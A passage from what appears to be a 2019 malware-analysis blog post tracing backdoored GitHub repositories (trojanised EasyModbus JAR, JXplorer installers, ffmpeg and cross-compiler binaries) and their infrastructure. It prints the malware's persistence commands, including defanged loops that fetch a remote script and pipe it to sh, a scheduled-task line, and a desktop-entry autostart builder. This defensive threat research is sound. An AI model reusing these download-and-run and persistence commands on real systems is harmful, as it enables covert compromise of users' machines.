+<p>There was no doubt about it, files were different. I used the <code>zipinfo</code> to list archives&#8217; files and metadata. The JAR from <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java">mansiiqkal/easymodbustcp-udp-java</a> was a bit larger (97272 vs 114504 bytes), included one additional file (<code>INumberOfConnectedClientsChangedDelegator1.class</code>) and according to timestamps was (re)packaged at 2018-03-22 18:29:58 (which in turn correlated with timestamp present in this <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java/commit/9df31ca1cc4570565c1af1010407b01a004ab4e3.patch">Git commit message</a>).</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/easymodbusjava_jar_zipinfo.png" title="EasyModbusJava.jar - zipinfo" alt="EasyModbusJava.jar - zipinfo"></p>
+
+<p>To be sure these were the only differences I used Jd-Gui to save decompiled Java classes from both JARs and then used WinMerge to see differences. Skipping negligible code formatting artifacts generated by the decompiler here is what I found:</p>
+
+<ul>
+<li>The extra file <code>de/re/easymodbus/server/INumberOfConnectedClientsChangedDelegator1.class</code> contained three large byte arrays and what seemed to be a decryption function</li>
+<li>12 other classes explicitly imported the <code>INumberOfConnectedClientsChangedDelegator1</code> class</li>
+</ul>
+
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/winmerge_easymodbusjava.png" title="WinMerge - EasyModbusJava" alt="WinMerge - EasyModbusJava"></p>
+
+<p>The code present in the <code>INumberOfConnectedClientsChangedDelegator1</code> class was designed to drop files to disk and establish persistence. The code used a custom decryption routine to decrypt an array of bytes and then used resulting blob (3011 bytes in total, MD5: <code>cf2ca657816af534c07c8ceca167e25b</code>, <a href="https://www.virustotal.com/#/file/7e79acf9ac55068cdee8e186ebabf5e391a80b294843998f7396ed4ce3039aff">VT</a>) as a source of file content and strings (file names, system commands).</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/easymodbusjava_decryption.png" title="EasyModbusJava - Decryption function" alt="EasyModbusJava - Decryption function"></p>
+
+<p>Depending on the operating system type the code was executed on, it performed different actions described below:</p>
+
+<h4>Linux</h4>
+
+<p>The code dropped a JAR file (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>) to <code>$HOME/.local/share/bbauto</code> and created a desktop entry persistence by setting <code>$HOME/.config/autostart/none.desktop</code> file to execute the following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c "java -jar $HOME/.local/share/bbauto"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The code also created an additional desktop entry <code>$HOME/.config/autostart/.desktop</code> set it to execute the following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c 'while true;do wget hxxp://eln.duckdns[.]org/se -O -|sh;sleep 60;done'</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>macOS</h4>
+
+<p>The code dropped a JAR file (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>) to <code>$HOME/Library/LaunchAgents/AutoUpdater.dat</code> and established persistence by creating a launch agent called <code>AutoUpdater</code> (<code>$HOME/Library/LaunchAgents/AutoUpdater.plist</code>).</p>
+
+<p>The code also created an additional launch agent called <code>SoftwareSync</code> set to execute the following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c 'while true;do curl hxxp://eln.duckdns[.]org/se -o -|sh;sleep 60;done'</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Windows</h4>
+
+<p>The code dropped a JAR file (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>) to <code>%temp%\..\Microsoft\ExplorerSync.db</code> and established persistence by executing following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The dropped JAR file (MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>) and Windows file and scheduled task names (<code>ExplorerSync.db</code>, <code>ExplorerSync</code>) were exactly the same as discovered in the modified JXplorer Tcl installer script. This created another plausible connection between the <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java">mansiiqkal/easymodbustcp-udp-java</a> repository and modified Windows installer of JXplorer.</p>
+
+<p>I also analyzed previous version of the <code>EasyModbusJava.jar</code> (MD5: <code>38f51f6555eba1f559b04e1311deee35</code>, <a href="https://www.virustotal.com/#/file/23a0a3af2c3a727ae5bf95c0a3d42e3f7ec5c466dd408bcbbbedf2aa4a5b9a5a">VT</a>) file committed to the <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java">mansiiqkal/easymodbustcp-udp-java</a> repository on <a href="https://github.com/mansiiqkal/easymodbustcp-udp-java/commit/8ea457708eeeba4c0bfbdb755ea589b0451c4c9a.patch">2018-02-20</a>. It contained the same additional Java class however code was a bit different due to changes in an encrypted array and offsets referencing decrypted data. When decrypted the blob (3011 bytes long, MD5: <code>9a3936c820c88a16e22aaeb11b5ea0e7</code>, <a href="https://www.virustotal.com/#/file/9deebbfc461d09aa5999f74552ad843a335751725ed7fe015580209c91b040f1">VT</a>) contained mostly the same data as later version. The only notable difference was usage of <code>%APPDATA%</code> instead of <code>%TEMP%</code> as a base directory for location of dropped JAR file on a Windows systems.</p>
+
+<h3>Summary</h3>
+
+<p>By following breadcrumbs I was able to discover and draw connections between pieces of malware and online infrastructure:</p>
+
+<ol>
+<li><p>The <a href="https://www.virustotal.com/#/file/5e3bba9a94ff757400ce5a0f2a2a43076c515bc0e3728964b4f58f503ed9917c">modified JXplorer Windows installer</a> found on VirusTotal and modified EasyModbus Java library found on GitHub (<a href="https://github.com/mansiiqkal/easymodbustcp-udp-java">mansiiqkal/easymodbustcp-udp-java</a>) dropped the same JAR file (FEN downloader, MD5: <code>9d4aeb737179995a397d675f41e5f97f</code>). Further similarities were visible in the dropped file path (<code>%TEMP%\..\Microsoft\ExplorerSync.db</code>) and scheduled task name (<code>ExplorerSync</code>)</p></li>
+<li><p>GitHub account <a href="https://github.com/mansiiqkal">mansiiqkal</a> was part of the same &ldquo;social circle&rdquo; as other GitHub accounts: <a href="https://github.com/ballory">ballory</a> and <a href="https://github.com/serkovs">serkovs</a>, among others. The accounts were linked by starring and subscribing to the same, confined set of GitHub repositories, including each other&rsquo;s repositories</p></li>
+<li><p>GitHub account <a href="https://github.com/ballory">ballory</a> created the <a href="https://github.com/ballory/ffmpeg">ballory/ffmpeg</a> repository containing modified version of ffmpeg tools. Malicious code present in these tools was set to download a file from the following SourceForge project URL <code>hxxp://allesare.sourceforge[.]net/</code>. The project was owned by an account named <code>allare778</code> (Stein SÃ¸rnson). The same account owned another project named <a href="https://sourceforge.net/projects/supremebot/">supremebot</a>, hosting a sneaker bot with the same name (and described as &ldquo;Supreme New York Bot&rdquo;)</p></li>
+<li><p>The <code>supremebot.jar</code> file (MD5: <code>2098d71cd1504c8be229f1f8feaa878b</code>) hosted by the SourceForge <a href="https://sourceforge.net/projects/supremebot/">supremebot</a> project was also present in the <a href="https://github.com/steisn/blazebot">steisn/blazebot</a> GitHub repository belonging to the account <a href="https://github.com/steisn">steisn</a> (Stein SÃ¸rnson). Additionally the YouTube account <a href="https://www.youtube.com/channel/UCiNWIOMXfaG3X1SjAWa34Ag">Stein SÃ¸rnson</a> hosted a <a href="https://www.youtube.com/watch?v=XewdaL3UuEw">video</a> about &ldquo;Blaze Bot Supreme NYC&rdquo;. Coincidentally, the malicious code present in the modified JXplorer Windows installer referenced &ldquo;blazebot&rdquo; and <code>supremenewyork[.]com</code></p></li>
+<li><p>GitHub account <a href="https://github.com/serkovs">serkovs</a> created the <a href="https://github.com/serkovs/jxplorer">serkovs/jxplorer</a> repository containing modified JXplorer Linux installer file. While the malicious code present in the binary did not reference any previously observed infrastructure both modified JXplorer installers (for Windows and Linux) could be connected by following linked GitHub accounts (see point 1.)</p></li>
+</ol>
+
+
+<h3>Is this the end?</h3>
+
+<p>Let&rsquo;s find out! Following up on specific indicators found in analyzed files and collected metadata about GitHub repositories I was able to discover additional related pieces of malicious code.</p>
+
+<p>I started with VirusTotal hunting capabilities - the search returned a set of binaries belonging to the same malware family: Eimea Lite App. The functionality and supported commands of this malware seems to be closely tied with previously discussed FEimea Portable App. The main difference is that while FEimea Portable App is written in Java, the Eimea Lite App comes in the form of compiled binaries for both Windows and Linux operating systems. Each observed instance of Eimea Lite App was built into the <a href="http://lame.sourceforge.net/">LAME</a> encoder tool, likely in order to thwart detection.</p>
+
+<p>One of the oldest samples uploaded to VirusTotal on 2017-08-26 was (unsurprisingly) named <code>supreme_bot2.cpl</code> (MD5: <code>815db0de2c6a610797c6735511eaaaf9</code>, <a href="https://www.virustotal.com/#/file/03722893c4990e0233c464e709943fb929b5cc70920c76b84a75f730f052f563">VT</a>). The sample uses two command and control servers: <code>sanemarine.duckdns[.]org</code>, <code>lemonade.freeddns[.]org</code>; contains two self signed certificates issued for <code>Allesare Ltd.</code> and supports similar set of commands as Java based FEimea Portable App:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>CAPABILITY EIAPrev1.33 EAUTH SELECT EXAMINE STATUS PWD LIST STAT SEARCH ESEARCH RENAME HASH FETCH COPY APPEND LINK SYMLINK REMOVE ACCESS NOOP LOGOUT</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The most recent sample <code>Aero.cpl</code> (MD5: <code>dd3a38ee6b5b6340acd3bb8099f928a8</code>, <a href="https://www.virustotal.com/#/file/b935aaa10a5b53184f33dfbc7f0314fd0ee11fb740711ce93b5a1c51d8fa1153">VT</a>) was uploaded to VirusTotal on 2018-11-25, which correlates with version string present in the file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Eimea Lite app - ver. 3.11  Mainline
+</span><span class='line'>Audio system : IMM Framework
+</span><span class='line'>Audio codecs : pcm lame-mp3 opencore-amrnb soxr
+</span><span class='line'>Build Nov 25 2018 11:54:25  Win32</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This instance uses the same command and control servers that were observed in initially analyzed sample of the FEimea Portable App (MD5: <code>65579b8ed47ca163fae2b3dffd8b4d5a</code>): <code>limons.duckdns[.]org</code> and <code>polarbear.freeddns[.]org</code>.</p>
+
+<p>My other search focused on further exploration of the GitHub graph. I previously mentioned that suspicious GitHub accounts and repositories created a confined network - however the graph also included entries that seemed to be a bit off.</p>
+
+<p>One of these entries was an account of Andrew Dunkins (<a href="https://github.com/adunkins">adunkins</a> [<a href="https://web.archive.org/web/20190221210742/https://github.com/adunkins">Wayback Machine copy</a>]), that included a set of nine repositories, each hosting Linux cross compilation tools. Each repository was watched or starred by several already known suspicious accounts.</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_adunkins.png" title="GitHub - adunkins" alt="GitHub - adunkins"></p>
+
+<p>The account seemed to be legitimate at first sight - it included a profile picture and description, which was not consistent with previously discovered accounts. However a look at a sample ELF binary (<code>i686-w64-mingw32-addr2line</code>, MD5: <code>b54156221d1c5387b8de0eb4605dc3a0</code>, <a href="https://www.virustotal.com/#/file/6240dcb817db34996360a074a530318c0d6521d7b9cf324da2eff7ad5cbbc250/">VT</a>) hosted in one of the repositories quickly proved I was wrong. At the end of the binary there was a shellcode, almost identical to the one found in the ffmpeg binaries obtained from the <a href="https://github.com/ballory/ffmpeg">ballory/ffmpeg</a> repository. The only difference was that shellcode was set to execute the following command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -c cd /home/`whoami`/.config;mkdir autostart;cd autostart;&gt;y echo [Desktop Entry];&gt;&gt;y echo Type=Application;&gt;&gt;y echo Exec=/bin/sh -c "'while true;do wget hxxp://allesare.sourceforge[.]net/test/msg -O -|sh;sleep 60;done'";chmod 755 y;mv y .desktop</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Overall there were 305 backdoored ELF binaries in nine GitHub repositories belonging to Andrew Dunkins.</p>
+
+<p>Following that trail I found one additional account (<a href="https://github.com/snacknroll11">snacknroll11</a>) that starred some of Andrew Dunkins&#8217; repositories and that contained a repository with interesting name and description (<a href="https://github.com/snacknroll11/streettalk_priv_bot">streettalk_priv_bot - Supreme Bot</a> [<a href="https://web.archive.org/web/20190221210443/https://github.com/snacknroll11/streettalk_priv_bot">Wayback Machine copy</a>]).</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/github_snacknroll11.png" title="GitHub - snacknroll11" alt="GitHub - snacknroll11"></p>
+
+<p>Despite the name and description of the binary, the file included in that repository (<code>supremebot.exe</code>) turned out to be something else - something that I have seen previously and something that provided a great closure for this post.</p>
+
+<p>The file <code>supremebot.exe</code> (MD5: <code>6ee28018e7d31aef0b4fd6940dff1d0a</code>, <a href="https://www.virustotal.com/#/file/c0313523c28288d01ba52289680b2405c1005ee7bbd0143cf116b0263245d8ba">VT</a>) was actually another modified version of JXplorer 3.3.1.2 installer for Windows. The installer also contained changed <code>http-2.7.9.tm</code> file (MD5: <code>3a75c6b9b8452587b9e809aaaf2ee8c4</code>, <a href="https://www.virustotal.com/#/file/6df26713ba5da9394db23c1d6d4b5ccd124997ebd0bfd59d1a127295c2961f81">VT</a>) however some actions performed by the Tcl script were slightly different from the initially analyzed version:</p>
+
+<ul>
+<li>It used BITSAdmin and PowerShell to download and execute a batch script from <code>hxxp://enl.duckdns[.]org</code></li>
+<li>It dropped a JAR file (MD5: <code>d7c4a1d4f75045a2a1e324ae5114ea17</code>, <a href="https://www.virustotal.com/#/file/210d12b9fcead69094ca2046c55333c121451f7eec782dd42e220ff11fe7d349">VT</a>) to <code>BR.jar</code>. The JAR file was another version of previously described JDL downloader</li>
+</ul>
+
+
+<p>So is this the end? I don&rsquo;t think so :-)</p>
+
+<p><img class="center" src="/images/the-supreme-backdoor-factory/sourceforge_allesare_test.png" title="SourceForge - allesare" alt="SourceForge - allesare"></p>
+
+<h3>Appendix</h3>
+
+<p><strong><em>Please note that GitHub has now removed identified accounts and repositories</em></strong>. Copies of the repositories showing their content are available via <a href="https://web.archive.org/">Wayback Machine</a>. Where possible I included links to Wayback Machine copies in the above post.</p>
+
+<p><a href="https://github.com/dfir-it/supreme-backdoor-factory/blob/master/github_accounts.txt">List of GitHub accounts</a></p>
+
+<p><a href="https://github.com/dfir-it/supreme-backdoor-factory/blob/master/github_repositories.txt">List of GitHub repositories</a></p>
+
+<p><a href="https://github.com/dfir-it/supreme-backdoor-factory/blob/master/iocs.csv">List of indicators</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">jj</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2019-02-26T17:53:15+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2019</span></span> <span class='time'>5:53 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/backdoor/'>backdoor</a>, <a class='category' href='/blog/categories/malware/'>malware</a>, <a class='category' href='/blog/categories/reverse-engineering/'>reverse engineering</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/05/08/down-the-rabbit-hole-with-packaged-powershell-scripts/" title="Previous Post: Down the rabbit hole with packaged PowerShell scripts">&laquo; Down the rabbit hole with packaged PowerShell scripts</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/02/26/the-supreme-backdoor-factory/">The Supreme Backdoor Factory</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/08/down-the-rabbit-hole-with-packaged-powershell-scripts/">Down the rabbit hole with packaged PowerShell scripts</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/03/29/tekdefense-network-challenge-001-walkthrough/">TekDefense Network Challenge 001 - Walkthrough</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/12/07/webshells-rise-of-the-defenders-part-4/">Webshells: Rise of the Defenders (Part 4)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/07/06/webshells-every-time-the-same-story-dot-dot-dot-part-3/">Webshells - Every Time the Same Storyâ¦(Part 3)</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/dfir-it">@dfir-it</a> on GitHub
+  
+  <script type="text/javascript">
+    $.domReady(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'dfir-it',
+            count: 2,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+<section class="twitterOct">
+  <h1 style="margin-bottom: 0.4em"> Tweets </h1>
+  <a class="twitter-timeline"
+	 data-dnt="true" href="https://twitter.com/dfir_it" 
+     data-widget-id="583720289420369920">
+     
+     Tweets by @dfir_it
+  </a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - dfir.it! -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  - <span class="credit">Theme by <a href="http://www.gehaxelt.in">Gehaxelt</a></span>
+  <span class="credit">and <a href="http://www.it-solutions-neef.de">IT Solutions Neef</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'dfirit';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/';
+        var disqus_url = 'http://dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
